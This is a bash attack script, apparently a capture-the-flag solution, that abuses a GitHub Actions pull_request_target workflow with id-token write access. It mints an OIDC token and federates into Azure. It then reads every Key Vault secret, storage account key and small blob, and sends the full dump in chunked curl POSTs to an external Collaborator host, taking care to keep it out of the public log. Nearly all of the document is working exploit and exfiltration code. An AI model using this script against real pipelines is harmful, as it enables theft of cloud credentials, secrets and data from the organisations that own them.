#!/usr/bin/env bash
# Tebamoto Logistics - step 5. Runs in the base repo's trusted context via
# pull_request_target + allow-unsafe-pr-checkout, with id-token: write.
#
# Read-only enumeration. Results go out-of-band to COLLAB so the public Actions
# log never contains the flag.
set -uo pipefail

COLLAB="qd7hc0dfk4496dnnphwewgj2dtjo778imqpse.oastify.com"
OUT="$(mktemp)"

say() { echo "[*] $*"; }                       # safe to show in the public log
keep() { echo "$*" >>"$OUT"; }                 # exfiltrated, never printed

say "runner up; requesting OIDC token"

# ---------------------------------------------------------------- 1. OIDC token
OIDC=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" \
  | jq -r '.value // empty')

if [ -z "$OIDC" ]; then
  say "FAILED to mint OIDC token (is id-token: write granted?)"
  exit 1
fi
say "OIDC token minted (${#OIDC} chars)"
keep "=== subject ==="
keep "$(echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null)"

# ------------------------------------------------- 2. federate into Azure
say "exchanging for an Azure token (client ${AZURE_CLIENT_ID:0:8}…, tenant ${AZURE_TENANT_ID:0:8}…)"
az login --service-principal \
  -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$OIDC" --allow-no-subscriptions >/dev/null 2>&1 \
  && say "az login OK" || say "az login FAILED"

keep "=== account ==="; keep "$(az account show 2>&1)"
keep "=== subscriptions ==="; keep "$(az account list --all -o json 2>&1)"

# ------------------------------------------------- 3. enumerate (read-only)
keep "=== resource groups (with tags) ==="
keep "$(az group list -o json 2>&1)"

keep "=== all resources (with tags) ==="
keep "$(az resource list -o json 2>&1)"

say "enumerating key vaults"
for V in $(az keyvault list --query "[].name" -o tsv 2>/dev/null); do
  keep "=== keyvault $V ==="
  for S in $(az keyvault secret list --vault-name "$V" --query "[].name" -o tsv 2>/dev/null); do
    keep "--- secret $S"
    keep "$(az keyvault secret show --vault-name "$V" --name "$S" --query value -o tsv 2>&1)"
  done
done

say "enumerating storage"
for A in $(az storage account list --query "[].name" -o tsv 2>/dev/null); do
  RG=$(az storage account list --query "[?name=='$A'].resourceGroup" -o tsv 2>/dev/null)
  K=$(az storage account keys list -n "$A" -g "$RG" --query "[0].value" -o tsv 2>/dev/null)
  [ -z "$K" ] && continue
  keep "=== storage $A ==="
  for C in $(az storage container list --account-name "$A" --account-key "$K" \
             --query "[].name" -o tsv 2>/dev/null); do
    keep "--- container $C"
    keep "$(az storage blob list --account-name "$A" --account-key "$K" -c "$C" \
            --query "[].name" -o tsv 2>&1)"
    for B in $(az storage blob list --account-name "$A" --account-key "$K" -c "$C" \
               --query "[?properties.contentLength < \`200000\`].name" -o tsv 2>/dev/null); do
      keep "----- blob $C/$B"
      keep "$(az storage blob download --account-name "$A" --account-key "$K" \
              -c "$C" -n "$B" --file /dev/stdout -o none 2>&1)"
    done
  done
done

# ------------------------------------------------- 4. report
if grep -qoE 'DF26\{[^}]+\}' "$OUT"; then
  say "FLAG FOUND - $(grep -coE 'DF26\{[^}]+\}' "$OUT") match(es), sent out-of-band"
else
  say "no DF26{...} match; full dump sent out-of-band for review"
fi
say "collected $(wc -c <"$OUT") bytes"

# chunked POST so nothing is truncated; bodies land in the Collaborator client
split -b 8000 "$OUT" /tmp/part_
i=0
for f in /tmp/part_*; do
  curl -sS -m 25 -X POST --data-binary "@$f" \
    -H 'Content-Type: text/plain' "http://${COLLAB}/p${i}" >/dev/null 2>&1
  i=$((i+1))
done
say "exfil done in $i chunk(s)"
